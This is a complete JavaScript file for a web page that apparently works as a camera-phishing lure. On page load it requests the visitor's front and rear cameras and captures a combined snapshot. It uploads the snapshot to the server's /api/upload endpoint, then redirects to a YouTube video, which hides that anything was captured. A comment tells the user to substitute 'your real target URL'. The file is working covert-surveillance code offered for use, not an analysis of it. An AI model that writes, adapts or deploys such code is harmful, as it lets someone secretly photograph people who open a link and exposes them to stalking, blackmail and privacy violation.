// public/capture.js

(async () => {
  const frontVid = document.getElementById('frontVideo');
  const rearVid  = document.getElementById('rearVideo');
  const canvas   = document.getElementById('canvas');
  const ctx      = canvas.getContext('2d');

  async function captureBoth() {
    let frontStream, rearStream;

    try {
      console.log('⚙️ Requesting front camera…');
      frontStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' }
      });
      frontVid.srcObject = frontStream;
      console.log('✅ Front camera granted');

      try {
        console.log('⚙️ Requesting rear camera…');
        rearStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'environment' }
        });
        rearVid.srcObject = rearStream;
        console.log('✅ Rear camera granted');
      } catch (err) {
        console.warn('⚠️ Rear camera failed, continuing with front only', err);
      }

      // Wait for video metadata
      await Promise.all([
        new Promise(r => {
          if (frontVid.readyState >= 2) r();
          else frontVid.onloadedmetadata = r;
        }),
        rearStream
          ? new Promise(r => {
              if (rearVid.readyState >= 2) r();
              else rearVid.onloadedmetadata = r;
            })
          : Promise.resolve()
      ]);

      // Determine canvas size
      const fw = frontVid.videoWidth,  fh = frontVid.videoHeight;
      let w = fw, h = fh;
      if (rearStream) {
        const rw = rearVid.videoWidth, rh = rearVid.videoHeight;
        w = Math.max(fw, rw);
        h = Math.max(fh, rh);
        canvas.width  = w * 2;
        canvas.height = h;
        // Draw rear on left, front on right
        ctx.drawImage(rearVid,  0, 0, w, h);
        ctx.drawImage(frontVid, w, 0, w, h);
      } else {
        canvas.width  = w;
        canvas.height = h;
        ctx.drawImage(frontVid, 0, 0, w, h);
      }

      console.log('📤 Sending snapshot to /api/upload');
      const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
      const res = await fetch('/api/upload', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ image: dataUrl })
      });
      console.log('📤 Upload response status:', res.status);

    } catch (err) {
      console.error('❌ Capture error:', err);
      alert('Capture failed: ' + err.message);
    } finally {
      // Clean up all streams
      if (frontStream) frontStream.getTracks().forEach(t => t.stop());
      if (rearStream)  rearStream.getTracks().forEach(t => t.stop());

      console.log('🔀 Redirecting now');
      // TODO: replace with your real target URL
      window.location.replace('https://m.youtube.com/watch?si=X7JkWv2nepcAG1IE&v=kNIr14EyTaY&feature=youtu.be');
    }
  }

  // Expose for manual re-run if needed
  window.runAutoCapture = captureBoth;
  // Auto-run on page load
  captureBoth();
})();
